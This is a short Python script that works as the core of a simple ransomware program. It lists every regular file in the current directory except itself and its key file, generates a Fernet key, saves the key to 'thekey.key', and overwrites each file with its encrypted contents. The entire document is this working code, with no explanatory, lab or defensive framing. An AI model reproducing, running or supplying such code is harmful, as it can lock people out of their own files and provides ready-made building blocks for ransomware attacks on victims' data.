import os
from cryptography.fernet import Fernet

# listing files
files = []

for file in os.listdir():
    if file == "main.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)


print(files)

# Generating Encryption key
key = Fernet.generate_key()

# Writing the key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypting the files
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
